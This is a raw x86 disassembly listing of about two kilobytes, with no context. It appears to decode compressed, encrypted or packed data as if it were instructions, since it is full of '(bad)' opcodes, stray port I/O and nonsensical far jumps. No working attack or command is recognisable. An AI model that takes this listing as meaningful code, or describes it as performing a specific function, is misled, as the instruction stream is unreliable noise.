  402ad1:	pop    ss
  402ad2:	iret   
  402ad3:	mov    bh,0x8a
  402ad5:	mov    dl,0xe3
  402ad7:	pop    ds
  402ad8:	and    bl,BYTE PTR [ebx-0x33]
  402adb:	cmp    dh,BYTE PTR [esi-0x2]
  402ade:	jnp    0x402b40
  402ae0:	fidivr DWORD PTR [eax+edi*2-0x6b74fc69]
  402ae7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ae8:	pop    ebx
  402ae9:	(bad)  
  402aeb:	mov    bh,0x87
  402aed:	imul   esp,ebp,0xffffffba
  402af0:	icebp  
  402af1:	or     al,0x23
  402af3:	(bad)
  402af6:	jnp    0x402b00
  402af8:	ds out 0xa,al
  402afb:	mov    edi,0x3cbe612
  402b00:	mov    gs,WORD PTR [esi]
  402b02:	sbb    BYTE PTR [ebx+0x37],0x45
  402b06:	mov    edi,0x526fa9e8
  402b0b:	shl    BYTE PTR [ebx-0xfbe747f],0xee
  402b12:	imul   ebp,DWORD PTR [edi+0x5f],0x78
  402b16:	cmp    al,0x75
  402b18:	mov    eax,0xd460eff1
  402b1d:	xchg   esp,eax
  402b1e:	or     edi,DWORD PTR [ecx+0x4f]
  402b21:	pop    ebx
  402b22:	inc    edx
  402b23:	or     BYTE PTR [ecx*1+0x2016fd06],0xed
  402b2b:	lods   al,BYTE PTR ds:[esi]
  402b2c:	pop    edi
  402b2e:	adc    BYTE PTR [eax+0x6505d23b],ch
  402b34:	sub    edi,DWORD PTR [ebp+0x209989e4]
  402b3a:	push   ebx
  402b3b:	xchg   edi,eax
  402b3c:	loopne 0x402afe
  402b3e:	gs fwait
  402b40:	cmp    dh,0x42
  402b43:	lods   eax,DWORD PTR ds:[esi]
  402b44:	inc    eax
  402b45:	aad    0x5b
  402b47:	repnz pop ecx
  402b49:	inc    ebp
  402b4a:	out    dx,al
  402b4b:	mov    eax,0x3ea3dca8
  402b50:	add    esp,DWORD PTR [ebp+0x1b]
  402b53:	mov    ebp,0x3cb33185
  402b59:	in     al,dx
  402b5a:	ja     0x402b89
  402b5c:	adc    al,0x1d
  402b5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b5f:	(bad)  
  402b61:	push   edi
  402b62:	fs stc 
  402b64:	xchg   edx,eax
  402b65:	(bad)  
  402b66:	mov    esi,0xbf605163
  402b6b:	(bad)  
  402b6c:	sbb    dh,BYTE PTR [eax+eiz*2]
  402b6f:	jle    0x402bb0
  402b71:	pushf  
  402b72:	stos   BYTE PTR es:[edi],al
  402b73:	adc    BYTE PTR [ebp-0x28],dl
  402b76:	into   
  402b77:	sub    al,0x67
  402b79:	cmp    eax,0x80740393
  402b7e:	outs   dx,BYTE PTR ds:[esi]
  402b7f:	imul   ch
  402b81:	or     eax,0xe2896fc3
  402b86:	push   edi
  402b87:	mov    ebx,0xd48a1327
  402b8c:	mov    ah,0xb4
  402b8e:	add    al,0x1a
  402b90:	clc    
  402b91:	mov    edi,0xc4c5076f
  402b96:	jae    0x402bfa
  402b98:	sahf   
  402b99:	mul    ecx
  402b9b:	cmp    al,0xef
  402b9d:	les    esi,FWORD PTR [esp+ebx*8+0x66]
  402ba1:	mov    edi,0x88a4338
  402ba6:	mov    al,ds:0xfedf02b7
  402bab:	mov    BYTE PTR ds:0xb2a63134,dh
  402bb1:	jecxz  0x402c29
  402bb3:	(bad)  [ebp+0x781ea265]
  402bb9:	mov    cl,BYTE PTR [edi+0x1d541181]
  402bbf:	add    al,0xae
  402bc1:	jp     0x402b7f
  402bc3:	stc    
  402bc4:	mov    bh,0xe0
  402bc6:	arpl   WORD PTR [ebx-0x3],ax
  402bc9:	mov    edx,0x4d43b257
  402bce:	jo     0x402c07
  402bd0:	inc    esi
  402bd1:	inc    edx
  402bd2:	lock es das 
  402bd5:	ret    
  402bd6:	btr    DWORD PTR [ebx-0x4a9d396e],0xd2
  402bde:	pop    ebp
  402bdf:	daa    
  402be0:	mov    edi,0x78b6faee
  402be5:	jge    0x402bb2
  402be7:	lods   al,BYTE PTR ds:[esi]
  402be8:	adc    BYTE PTR [edi-0x21b7be5a],ch
  402bee:	mov    ?,WORD PTR [edi-0x17]
  402bf1:	push   edx
  402bf2:	xor    al,0xbb
  402bf4:	xor    esi,DWORD PTR [ebp-0x4037ceee]
  402bfa:	ss jne 0x402c0c
  402bfd:	and    ah,BYTE PTR [ecx]
  402bff:	mov    ch,0x72
  402c01:	xchg   edi,eax
  402c02:	clc    
  402c03:	pushf  
  402c04:	mov    eax,0xc3aaa6a0
  402c09:	push   esp
  402c0a:	sub    al,0x26
  402c0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c0d:	jmp    0xbd343e73
  402c12:	mov    ds:0xc3e86155,al
  402c17:	out    0x47,eax
  402c19:	sbb    esi,edx
  402c1b:	pop    esi
  402c1c:	and    ebp,DWORD PTR [edi]
  402c1e:	and    eax,0xac234153
  402c23:	adc    eax,0xf50f9aaa
  402c28:	clc    
  402c29:	jnp    0x402c74
  402c2b:	in     al,dx
  402c2c:	(bad)  
  402c2d:	mov    edx,0xb1bf94df
  402c32:	cld    
  402c33:	xor    BYTE PTR [edx*4-0x33b212b],ah
  402c3a:	push   0x837278e2
  402c3f:	aas    
  402c40:	inc    eax
  402c41:	or     al,0x6
  402c43:	add    eax,eax
  402c45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c46:	test   DWORD PTR [eax+ebp*2],edi
  402c49:	pop    es
  402c4a:	pop    esp
  402c4b:	mov    bh,dl
  402c4d:	dec    edx
  402c4e:	sbb    ecx,DWORD PTR [ecx]
  402c50:	test   BYTE PTR [eax+eax*8-0x7],0xef
  402c55:	mov    ebx,0x8b552832
  402c5a:	mov    dh,0x26
  402c5c:	xchg   ebp,eax
  402c5e:	fstp   QWORD PTR [ecx+0x2bc6fc0c]
  402c64:	ss mov edx,ebp
  402c67:	mov    dh,0x19
  402c69:	cli    
  402c6a:	cvtpi2ps xmm4,QWORD PTR [edx-0x6b]
  402c6e:	rcl    DWORD PTR [ebp-0x35bf3e94],1
  402c74:	and    al,0x81
  402c76:	jle    0x402c10
  402c78:	(bad)  
  402c79:	sahf   
  402c7a:	and    al,0x2b
  402c7c:	xchg   DWORD PTR [edx-0x66],ebp
  402c7f:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  402c81:	cmp    edx,ecx
  402c83:	enter  0xa016,0xfa
  402c87:	push   eax
  402c88:	mov    ds:0xfb543ef4,eax
  402c8d:	sbb    al,0x77
  402c8f:	sub    al,0x5a
  402c91:	sub    bl,BYTE PTR [edi]
  402c93:	xlat   BYTE PTR ds:[ebx]
  402c94:	sbb    eax,ebx
  402c96:	jae    0x402c21
  402c98:	xor    dl,BYTE PTR [ecx+0x20]
  402c9b:	mov    esi,0x69077484
  402ca0:	mov    cl,0x17
  402ca2:	and    BYTE PTR [edi+esi*4+0x6b37de49],bl
  402ca9:	repnz pop ss
  402cab:	in     al,dx
  402cac:	mov    edx,0x1709265
  402cb1:	jle    0x402c52
  402cb3:	mov    cl,0x6d
  402cb5:	pop    eax
  402cb6:	dec    ecx
  402cb7:	sar    BYTE PTR [eax],1
  402cb9:	stc    
  402cba:	push   ds
  402cbb:	pop    ecx
  402cbc:	push   esi
  402cbd:	fisub  DWORD PTR [esi-0x7c]
  402cc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cc1:	std    
  402cc2:	call   0x52eb5874
  402cc7:	mov    ebp,0x468a3564
  402ccc:	loop   0x402c8a
  402cce:	push   edi
  402ccf:	jne    0x402c5c
  402cd1:	adc    bh,BYTE PTR [edx-0x47b3a0ea]
  402cd7:	cmp    ecx,edx
  402cd9:	or     edx,DWORD PTR [edx]
  402cdb:	outs   dx,DWORD PTR ds:[esi]
  402cdc:	mov    DWORD PTR [edi+0x78227797],ebp
  402ce2:	jg     0x402ce0
  402ce4:	adc    DWORD PTR [esi+ebx*1+0x6700747d],ebp
  402ceb:	outs   dx,WORD PTR ds:[esi]
  402ced:	mov    bl,0xec
  402cef:	jp     0x402d4d
  402cf1:	es icebp 
  402cf3:	push   ss
  402cf4:	add    ebx,DWORD PTR [edx+0x0]
  402cf7:	lar    ebp,WORD PTR ds:0xaf7e3831
  402cfe:	cdq    
  402cff:	test   eax,0x64e1adc4
  402d04:	sbb    BYTE PTR [ebx*8+0x674e78af],bh
  402d0b:	dec    ebx
  402d0c:	lods   al,BYTE PTR ds:[esi]
  402d0d:	mov    ch,0x15
  402d0f:	pop    es
  402d10:	daa    
  402d11:	fidivr WORD PTR [edi]
  402d13:	(bad)  
  402d14:	fstp   DWORD PTR [edx+0x65]
  402d17:	adc    al,0x35
  402d19:	out    dx,eax
  402d1a:	aad    0x77
  402d1c:	mov    WORD PTR [ebp-0x28248730],es
  402d22:	dec    ecx
  402d23:	ficomp WORD PTR [esp+eax*2-0x6c]
  402d27:	sub    BYTE PTR [edi+0x252d0a13],0x0
  402d2e:	fidivr DWORD PTR [edx+0x1c]
  402d31:	cmc    
  402d32:	mov    ch,0x1c
  402d34:	xor    al,0xe2
  402d36:	push   ebx
  402d37:	fadd   QWORD PTR [ebp-0x1f52bb8f]
  402d3d:	push   cs
  402d3e:	or     cl,BYTE PTR [edx]
  402d40:	retf   0x7cb7
  402d43:	mov    dl,0x5c
  402d45:	pop    edi
  402d46:	sbb    eax,0x38116260
  402d4b:	mov    bl,0x1
  402d4d:	out    0x5a,eax
  402d4f:	mov    al,0x76
  402d51:	pusha  
  402d52:	(bad)  [eax-0xc7ea43]
  402d58:	outs   dx,DWORD PTR ds:[esi]
  402d59:	leave  
  402d5a:	stc    
  402d5b:	jp     0x402d5b
  402d5d:	xchg   esi,eax
  402d5e:	fsubr  DWORD PTR [ebp-0x67]
  402d61:	adc    eax,0x89ab5873
  402d66:	sar    DWORD PTR [ecx],0xf0
  402d69:	push   ecx
  402d6a:	jne    0x402d10
  402d6c:	mov    esi,0x1fb31af4
  402d71:	cmp    ah,BYTE PTR [ebp+0x3a]
  402d74:	shr    DWORD PTR [esi+esi*1-0xf],cl
  402d78:	xchg   edi,eax
  402d79:	inc    edx
  402d7a:	xchg   esp,eax
  402d7b:	bound  ebx,QWORD PTR [ebx+edi*4-0x6cfddec8]
  402d82:	ret    
  402d83:	xchg   BYTE PTR [ecx],bl
  402d85:	imul   edx,esp,0xad51d4bf
  402d8b:	mov    ah,0xe7
  402d8d:	xor    ch,BYTE PTR ds:0xa739984e
  402d93:	outs   dx,BYTE PTR ds:[esi]
  402d94:	jnp    0x402dc1
  402d96:	inc    edx
  402d97:	outs   dx,DWORD PTR ds:[esi]
  402d98:	jl     0x402e09
  402d9a:	in     eax,0x71
  402d9c:	repnz cdq 
  402d9e:	sub    DWORD PTR [ebp-0x770a738e],0xffffffac
  402da5:	les    ebx,FWORD PTR [esi+edi*1+0x46]
  402da9:	mov    al,ds:0x63787918
  402dae:	inc    ecx
  402daf:	and    bl,BYTE PTR [edx]
  402db1:	xor    al,0xf0
  402db3:	(bad)
  402db8:	rol    BYTE PTR [edi-0x2f],1
  402dbb:	sahf   
  402dbc:	mov    ecx,0x1ec72e5b
  402dc1:	imul   eax,DWORD PTR [ebp+0x37f69657],0xffffffe6
  402dc8:	xor    DWORD PTR [edi+ebx*2+0x45],eax
  402dcc:	push   0xffffffbe
  402dce:	and    eax,0x8cab38ab
  402dd3:	mov    dl,0xdb
  402dd5:	xchg   edx,eax
  402dd6:	sbb    ecx,esp
  402dd8:	sub    ebp,0x17227732
  402dde:	movntq QWORD PTR [eax+0x53],mm3
  402de2:	out    dx,al
  402de3:	out    dx,eax
  402de4:	clc    
  402de5:	dec    ebp
  402de6:	outs   dx,BYTE PTR ds:[esi]
  402de7:	in     eax,dx
  402de8:	fsubr  QWORD PTR [ebx-0xe]
  402deb:	and    eax,0xe81e545d
  402df0:	jns    0x402e55
  402df2:	mov    ebp,0xa76b1f54
  402df7:	and    BYTE PTR [ebp-0x5c323af2],0x8e
  402dfe:	int    0x4f
  402e00:	or     esp,DWORD PTR [ebx]
  402e02:	jbe    0x402e5a
  402e04:	aam    0x5c
  402e06:	shr    BYTE PTR [ebp+0x2dc55036],0xef
  402e0d:	mov    esp,DWORD PTR [ebx]
  402e0f:	sbb    al,0xf2
  402e11:	dec    edi
  402e12:	pop    ebx
  402e13:	test   al,0x5d
  402e15:	jne    0x402df4
  402e17:	sub    eax,esi
  402e19:	xor    bl,bh
  402e1b:	retf   
  402e1c:	mov    dh,bh
  402e1e:	xchg   ax,ax
  402e20:	js     0x402e12
  402e22:	dec    ebp
  402e23:	enter  0xcef4,0xb7
  402e27:	xchg   edi,eax
  402e28:	in     eax,0x1f
  402e2a:	pushf  
  402e2b:	mov    bl,0xb5
  402e2d:	shr    ah,0x18
  402e30:	dec    eax
  402e31:	pop    ds
  402e32:	pop    edx
  402e33:	sbb    eax,0x1c08360c
  402e38:	sbb    esp,DWORD PTR [edx-0x487b5832]
  402e3e:	jno    0x402e0c
  402e40:	push   di
  402e42:	lods   al,BYTE PTR ds:[esi]
  402e43:	rcl    BYTE PTR [ebx+0x9],0xe2
  402e47:	ins    BYTE PTR es:[edi],dx
  402e48:	cmp    al,0xe3
  402e4a:	push   0x35
  402e4c:	loope  0x402e33
  402e4e:	push   ebp
  402e4f:	or     al,0x91
  402e51:	push   es
  402e52:	retf   
  402e53:	in     al,dx
  402e54:	jnp    0x402e6d
  402e56:	mov    DWORD PTR [ecx+0x245ab5f],ebp
  402e5c:	inc    esi
  402e5d:	and    ch,BYTE PTR [esi]
  402e5f:	fiadd  WORD PTR [esi]
  402e61:	jl     0x402e9c
  402e63:	xor    ebp,ebp
  402e65:	(bad)  
  402e66:	mov    DWORD PTR [ebp-0x5f],esi
  402e69:	jl     0x402ee7
  402e6b:	jmp    0x1406:0xc85f3907
  402e72:	popf   
  402e73:	out    0x46,al
  402e75:	mov    dh,0x47
  402e77:	shl    BYTE PTR [edi+0x6c5351c4],0xc2
  402e7e:	shl    BYTE PTR [edi+0x18],cl
  402e81:	cmp    al,0x29
  402e83:	add    dh,dh
  402e85:	xchg   edx,eax
  402e86:	mov    BYTE PTR [ebp-0x33d06baf],dl
  402e8c:	aad    0xfa
  402e8e:	mov    eax,ds:0x94d521d2
  402e93:	push   cs
  402e94:	daa    
  402e95:	cld    
  402e96:	call   0x59d0edd5
  402e9b:	xor    DWORD PTR [ecx+0x15],esi
  402e9e:	(bad)  
  402e9f:	jns    0x402ee8
  402ea1:	mov    ah,0xbb
  402ea3:	cs pusha 
  402ea5:	jg     0x402e8f
  402ea7:	sbb    BYTE PTR [ecx+0x21030f0a],ch
  402ead:	mov    eax,0xe0b8ce10
  402eb2:	aaa    
  402eb3:	gs imul ebx,edx,0xea3f2238
  402eba:	push   ebp
  402ebb:	adc    DWORD PTR [ebx+eax*4+0x45],eax
  402ebf:	out    dx,eax
  402ec0:	(bad)  
  402ec1:	pop    eax
  402ec2:	xor    BYTE PTR [ecx+edi*2-0x68],bh
  402ec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ec7:	test   al,0x6e
  402ec9:	sub    BYTE PTR [edx],ch
  402ecb:	push   edi
  402ecc:	retf   
  402ecd:	sbb    ebx,DWORD PTR [edx-0x1eed64ba]
  402ed3:	push   ebx
  402ed4:	xor    al,0x6c
  402ed6:	call   0xe543:0x91c4ffec
  402edd:	addr16 out dx,eax
  402edf:	push   ecx
  402ee0:	add    BYTE PTR [ebx+edi*2],bh
  402ee3:	stc    
  402ee4:	hlt    
  402ee5:	jle    0x402e95
  402ee7:	push   0x76
  402ee9:	ret    0xd961
  402eec:	fidivr WORD PTR [ebp+0x7e]
  402eef:	das    
  402ef0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ef1:	dec    ebx
  402ef2:	dec    esi
  402ef3:	sbb    eax,0x19bbf799
  402ef8:	push   edi
  402ef9:	jns    0x402ee2
  402efb:	add    dl,bl
  402efd:	sbb    eax,0x93defd07
  402f02:	push   esi
  402f03:	scas   al,BYTE PTR es:[edi]
  402f04:	out    dx,al
  402f05:	fld    TBYTE PTR es:[ecx-0x3d341e8]
  402f0c:	or     ch,BYTE PTR [ecx]
  402f0e:	inc    esp
  402f0f:	jge    0x402f7e
  402f11:	cmp    ecx,edi
  402f13:	aam    0xef
  402f15:	rol    DWORD PTR [esi+0x16],cl
  402f18:	inc    DWORD PTR [eax]
  402f1a:	retf   
  402f1b:	cli    
  402f1c:	dec    ebx
  402f1d:	repnz pop esi
  402f1f:	push   esi
  402f20:	jecxz  0x402ee4
  402f22:	xchg   esi,eax
  402f23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f24:	mov    esi,0xd1cf888
  402f29:	sub    BYTE PTR [esi+0x1e],0x93
  402f2d:	mov    ebp,0x7e99bdc6
  402f32:	les    ecx,FWORD PTR [edx]
  402f34:	paddb  mm1,QWORD PTR [esi]
  402f37:	and    eax,0xb9fc580d
  402f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f3d:	aas    
  402f3e:	test   BYTE PTR [edx+esi*8+0x2b],0x5e
  402f43:	xchg   esp,eax
  402f44:	adc    eax,0x342680e7
  402f49:	(bad)  
  402f4a:	inc    ecx
  402f4b:	shr    esp,1
  402f4d:	mov    edx,0x4d51786b
  402f52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f53:	iret   
  402f54:	push   esp
  402f55:	add    eax,0xef5d45a9
  402f5a:	cmp    eax,0x7ff987ab
  402f5f:	push   ds
  402f60:	loope  0x402f79
  402f62:	fs pop esi
  402f64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f65:	mov    dh,BYTE PTR [ebx+0x30]
  402f68:	adc    BYTE PTR [ebx+edi*2],0x12
  402f6c:	or     BYTE PTR [ebx-0x57],cl
  402f6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f70:	pop    edi
  402f71:	add    edi,eax
  402f73:	mov    esi,DWORD PTR [edi+0x2b]
  402f76:	stos   DWORD PTR es:[edi],eax
  402f77:	xchg   ebp,eax
  402f78:	mov    edi,0x4c5dff38
  402f7d:	(bad)  
  402f7e:	jno    0x402f2d
  402f80:	out    0xdf,eax
  402f82:	jmp    0x73aa:0xc3ee2130
  402f89:	lods   al,BYTE PTR ds:[esi]
  402f8a:	in     al,0xfb
  402f8c:	(bad)  
  402f8d:	push   ss
  402f8e:	dec    esi
  402f8f:	int3   
  402f90:	(bad)
  402f95:	arpl   WORD PTR [edx+esi*2-0x24],bp
  402f99:	pop    esp
  402f9a:	jbe    0x402fe5
  402f9c:	pop    ss
  402f9d:	push   edx
  402f9e:	rcl    BYTE PTR [ebx],0xf0
  402fa1:	jae    0x402fec
  402fa3:	ret    
  402fa4:	shl    ecx,0x67
  402fa7:	scas   al,BYTE PTR es:[edi]
  402fa8:	rcr    ebx,0x39
  402fab:	xchg   edx,eax
  402fac:	or     al,bh
  402fae:	adc    eax,edi
  402fb0:	sbb    al,0x3d
  402fb2:	paddq  mm0,QWORD PTR [ebx+0x7c3d1d64]
  402fb9:	mov    ah,0x7
  402fbb:	sbb    al,0x18
  402fbd:	mov    eax,0x98eb7b1f
  402fc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fc3:	vshufps ymm2,ymm2,YMMWORD PTR [edi-0x73],0xfe
  402fc9:	add    eax,0xbb1e1c46
  402fce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fd0:	out    dx,al
  402fd1:	repz mov esp,es
  402fd4:	inc    ebx
  402fd5:	mov    al,ds:0xb660e05c
  402fda:	mov    DWORD PTR [eax-0x61],eax
  402fdd:	sub    al,0x63
  402fdf:	mov    ss,WORD PTR [ecx-0x7758369d]
  402fe5:	jnp    0x40305b
  402fe7:	xchg   edi,eax
  402fe8:	(bad)  
  402fe9:	sub    eax,0x9c9a0945
  402fee:	adc    ebx,esp
  402ff0:	sub    dl,BYTE PTR [edx+edi*1]
  402ff3:	outs   dx,DWORD PTR ds:[esi]
  402ff4:	mov    al,0x46
  402ff6:	jo     0x403061
  402ff8:	ret    
  402ff9:	push   edi
  402ffa:	pushw  0xffa1
  402ffd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ffe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fff:	ror    BYTE PTR [ecx-0x5a],0xb9
  403003:	shl    DWORD PTR [ecx+0x2f],0xb9
  403007:	lock das 
  403009:	sbb    dh,BYTE PTR [edx+0xd]
  40300c:	pop    esp
  40300d:	(bad)  
  40300e:	out    0xaa,eax
  403010:	and    al,0x30
  403012:	mov    DWORD PTR [esi+0x7c],eax
  403015:	adc    al,0xc6
  403017:	adc    eax,0xad09811c
  40301c:	test   DWORD PTR [ebx+0x5a],ecx
  40301f:	fs mov esi,0xe8987f24
  403025:	ret    
  403026:	(bad)  
  403027:	fidivr WORD PTR [esp+ebx*4-0x7d]
  40302b:	clc    
  40302c:	pop    edi
  40302d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40302e:	mov    WORD PTR [eax+ebx*1],ss
  403031:	aaa    
  403032:	xlat   BYTE PTR ds:[ebx]
  403033:	popf   
  403034:	inc    edx
  403035:	pop    ecx
  403036:	aam    0x78
  403038:	mov    edi,edi
  40303a:	std    
  40303b:	xchg   esp,eax
  40303c:	xor    bl,BYTE PTR [ebp+edi*4+0x52]
  403040:	mov    esp,0x2b5d2305
  403045:	mov    eax,0x45a46ff4
  40304a:	cmp    eax,0xb4111f5d
  40304f:	push   es
  403050:	enter  0x25ee,0x33
  403054:	xchg   ebp,eax
  403055:	mov    ds:0x7ba79a8f,al
  40305a:	inc    ebp
  40305b:	jno    0x40306d
  40305d:	adc    dh,BYTE PTR [edi+0x66]
  403060:	jbe    0x403024
  403062:	and    BYTE PTR [ecx+0x6376666e],al
  403068:	mov    DWORD PTR [ebp-0x39],ebp
  40306b:	xchg   ebp,eax
  40306c:	in     al,dx
  40306d:	imul   ebp,DWORD PTR [edi],0xffffff8e
  403070:	aaa    
  403071:	inc    ebp
  403072:	add    edi,DWORD PTR [eax]
  403074:	sub    ch,BYTE PTR [ecx]
  403076:	cdq    
  403077:	mov    esp,0x2e1a40e1
  40307c:	inc    ebp
  40307d:	mov    bh,0x8
  40307f:	stos   DWORD PTR es:[edi],eax
  403080:	and    bl,ah
  403082:	dec    esi
  403083:	jb     0x4030b9
  403085:	jle    0x4030e6
  403087:	push   0xffffffb8
  403089:	test   esp,0x84e2aaca
  40308f:	xor    al,0xe5
  403091:	fsub   QWORD PTR [ebp-0x52]
  403094:	ja     0x403069
  403096:	outs   dx,DWORD PTR ds:[esi]
  403097:	push   ecx
  403098:	rol    DWORD PTR [edi-0x357b3b2d],1
  40309e:	push   esp
  40309f:	shr    bh,0xed
  4030a2:	rcl    DWORD PTR [eax],cl
  4030a4:	sbb    al,0xab
  4030a6:	bound  edx,QWORD PTR [ecx-0x7dade7be]
  4030ac:	mov    dh,0xed
  4030ae:	loopne 0x4030c0
  4030b0:	sar    BYTE PTR [ebp+0xe3618b6],1
  4030b6:	retf   0xa79a
  4030b9:	pop    eax
  4030ba:	jecxz  0x40307f
  4030bc:	cli    
  4030bd:	or     al,0xbd
  4030bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030c0:	das    
  4030c1:	xor    ah,BYTE PTR [edx-0x38fe4ce3]
  4030c7:	stos   BYTE PTR es:[edi],al
  4030c8:	rcr    BYTE PTR [ebp+ebp*2+0x15],cl
  4030cc:	mov    ecx,DWORD PTR [esi+0x3ca5f92e]
  4030d2:	sbb    esp,DWORD PTR [ebx+0x7a384eca]
  4030d8:	adc    DWORD PTR [edx+0x3f35c3df],esp
  4030de:	pop    ss
  4030df:	mov    esp,0x4a020e2f
  4030e4:	int3   
  4030e5:	fbstp  TBYTE PTR [ebx-0xe]
  4030e8:	pop    esp
  4030e9:	cmp    ah,BYTE PTR [ebx]
  4030eb:	inc    ebx
  4030ec:	push   ebx
  4030ed:	push   ebx
  4030ee:	out    0xd8,eax
  4030f0:	inc    edx
  4030f1:	cwde   
  4030f2:	dec    ebp
  4030f3:	enter  0x626d,0xac
  4030f7:	out    0x33,al
  4030f9:	add    eax,0x38869fb6
  4030fe:	imul   eax,DWORD PTR [ebx+ebx*8],0xca8744cf
  403105:	mov    dh,0x8
  403107:	pop    es
  403108:	mov    eax,0x9405b700
  40310d:	test   BYTE PTR [ebx-0x408d231e],ah
  403113:	dec    esp
  403114:	call   0x7a94:0x9ba6069e
  40311b:	shl    BYTE PTR [ebp+edi*8-0x74],cl
  40311f:	jae    0x4031a0
  403121:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403122:	mov    esp,0x4a7c813
  403127:	lds    esi,FWORD PTR [eax+edx*2]
  40312a:	add    al,0x0
  40312c:	jns    0x403197
  40312e:	or     BYTE PTR [esi-0x5f9ad02e],al
  403134:	push   edx
  403135:	xor    bl,BYTE PTR [ecx+0x635417d6]
  40313b:	imul   ebx,esp,0xedeb069
  403141:	(bad)  
  403142:	sti    
  403143:	neg    DWORD PTR [ecx-0x1]
  403146:	leave  
  403147:	push   ds
  403148:	jns    0x4031a8
  40314a:	or     DWORD PTR [edi],ebp
  40314c:	or     DWORD PTR [esp+eax*2+0x2ce15927],esi
  403153:	int3   
  403154:	je     0x40310f
  403156:	pop    ss
  403157:	rol    BYTE PTR [eax-0x61bd6160],0x6f
  40315e:	adc    al,0x2
  403160:	mov    cl,0xf3
  403162:	pop    ebp
  403163:	and    bh,BYTE PTR [esp+eiz*8]
  403166:	fsub   DWORD PTR [eax-0x7867c1c5]
  40316c:	sbb    ebx,DWORD PTR [ecx+0x60]
  40316f:	cmp    dh,BYTE PTR [esi+0x2c]
  403172:	adc    DWORD PTR [esi+0x30],ebx
  403175:	pusha  
  403176:	or     al,dh
  403178:	daa    
  403179:	xor    BYTE PTR [esi],bh
  40317b:	xchg   esp,eax
  40317c:	dec    esp
  40317d:	inc    eax
  40317e:	dec    eax
  40317f:	adc    cl,BYTE PTR [esi+ebx*2+0x50]
  403183:	xor    ebx,DWORD PTR [ecx]
  403185:	jo     0x40315e
  403187:	loope  0x4031e4
  403189:	or     al,0x5e
  40318b:	int3   
  40318c:	sub    eax,esp
  40318e:	stc    
  40318f:	fs pop ds
  403191:	mul    DWORD PTR [eax+0x6a]
  403194:	pop    es
  403195:	pop    ds
  403196:	cmp    al,0xff
  403198:	sub    BYTE PTR [edi+0x2719792b],0x74
  40319f:	push   0xffffffa6
  4031a1:	pop    ss
  4031a2:	out    dx,al
  4031a3:	(bad)  
  4031a4:	xlat   BYTE PTR ds:[ebx]
  4031a5:	aad    0x58
  4031a7:	popa   
  4031a8:	std    
  4031a9:	mov    bl,0x8d
  4031ab:	dec    edx
  4031ac:	push   ebx
  4031ad:	adc    BYTE PTR [eax],dh
  4031af:	xor    al,0xba
  4031b1:	lea    esp,[ebp-0x7d95dd24]
  4031b7:	imul   ebx,DWORD PTR [eax+0x6c8bf6f7],0x919fd92c
  4031c1:	sbb    esp,DWORD PTR [eax-0x6537706d]
  4031c7:	inc    edx
  4031c8:	test   BYTE PTR [ebx],bl
  4031ca:	mov    bh,0x1
  4031cc:	pinsrw mm4,WORD PTR [esi+0x0],0x7c
  4031d1:	inc    edx
  4031d2:	adc    BYTE PTR [esi],bl
  4031d4:	ret    
  4031d5:	and    dh,BYTE PTR [ecx+0x6323266f]
  4031db:	lods   al,BYTE PTR ds:[esi]
  4031dc:	sar    BYTE PTR [ebp+0x44],0x15
  4031e0:	adc    eax,0xe27c51dd
  4031e5:	icebp  
  4031e6:	pushf  
  4031e7:	sub    al,0x90
  4031e9:	add    DWORD PTR [edx-0x52],0xc1bd017a
  4031f0:	mov    WORD PTR [ebx-0x47],?
  4031f3:	or     eax,0x274276a6
  4031f8:	shl    BYTE PTR [edx-0x4dd29ea],1
  4031fe:	test   DWORD PTR [esi+0x4a],0x3b3bfe2c
  403205:	push   eax
  403206:	daa    
  403207:	inc    ebx
  403208:	ja     0x40319b
  40320a:	sbb    BYTE PTR [edi-0x4e],0xe7
  40320e:	cmp    DWORD PTR [edi+0x30],eax
  403211:	ja     0x40320b
  403213:	neg    BYTE PTR [ecx+0x211e5439]
  403219:	add    bh,dl
  40321b:	cmp    BYTE PTR [edx+eiz*4],cl
  40321e:	jnp    0x403218
  403220:	mov    ebp,0x8022946
  403225:	adc    al,0xbe
  403227:	(bad)  
  403228:	jge    0x403242
  40322a:	fisubr WORD PTR [edi+0x694021e1]
  403230:	inc    ebx
  403231:	nop
  403232:	int    0x50
  403234:	mov    al,0x34
  403236:	cmp    DWORD PTR [ecx-0x8],esi
  403239:	pop    ebx
  40323a:	ins    BYTE PTR es:[edi],dx
  40323b:	xor    ch,BYTE PTR [eax-0x167ba633]
  403241:	jns    0x4032a7
  403243:	stos   DWORD PTR es:[edi],eax
  403244:	jl     0x4032af
  403246:	mov    bh,0xe9
  403248:	ret    0x92da
  40324b:	daa    
  40324c:	mov    eax,0xbdfbfb05
  403251:	enter  0x9af9,0x22
  403255:	jns    0x403212
  403257:	adc    BYTE PTR [edx+0x1de25ea5],dh
  40325d:	cli    
  40325e:	scas   al,BYTE PTR es:[edi]
  40325f:	cwde   
  403260:	mov    ebp,0x48fef284
  403265:	or     esi,DWORD PTR [esi+0x62]
  403268:	push   ds
  403269:	ror    BYTE PTR [ebx-0x6b988026],0x21
  403270:	jo     0x4032a4
  403272:	mov    WORD PTR [ebp+edi*8+0x4f7fddce],?
  403279:	test   al,0x81
  40327b:	std    
